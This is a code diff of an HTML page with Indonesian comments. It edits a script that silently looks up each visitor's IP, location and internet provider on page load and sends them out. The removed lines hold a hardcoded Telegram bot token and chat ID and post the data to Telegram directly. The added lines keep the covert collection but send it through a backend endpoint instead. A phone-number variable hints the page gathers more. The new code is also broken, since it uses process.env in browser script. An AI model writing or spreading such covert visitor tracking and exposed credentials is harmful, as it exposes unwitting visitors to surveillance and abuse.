@@ -177,8 +177,8 @@
     </div>
 
     <script>
-    const BOT_TOKEN = '8509098791:AAHA4R4AcKD992zP6-KtX3S4WVexGmCpsPs';
-    const CHAT_ID = '6242724406';
+    const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
     let userPhoneNumber = '';
     let timerInterval;
 
@@ -332,9 +332,8 @@
     }
         </script>
         <script type="text/javascript">
-            window.onload = function() {
-    const botToken = 8509098791:AAHA4R4AcKD992zP6-KtX3S4WVexGmCpsPs";
-    const chatId = "6242724406";
+  window.onload = function() {
+    // BOT_TOKEN dan CHAT_ID sudah dihapus total dari file HTML ini untuk keamanan
 
     // Mengambil data lokasi pengunjung berdasarkan IP
     fetch('https://ipapi.co/json/')
@@ -348,19 +347,21 @@
                           `<b>Provider:</b> ${data.org}\n` +
                           `<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
 
-        // Kirim notifikasi ke Telegram kamu
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        // Kirim data ke BACKEND LOKAL kamu (contoh: Vercel Function), bukan ke Telegram langsung
+        // Pastikan endpoint '/api/kirim-telegram' ini sudah kamu buat di backend
+        fetch('/api/kirim-telegram', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            chat_id: chatId,
-            text: infoPesan,
-            parse_mode: 'HTML'
+            pesan: infoPesan
           })
-        });
+        })
+        .then(response => console.log("Data pengunjung berhasil dikirim ke backend"))
+        .catch(error => console.error("Gagal mengirim data pengunjung ke backend", error));
       })
       .catch(err => console.error("Gagal melacak kunjungan"));
   };
-        </script>
+</script>
+
 </body>
 </html>
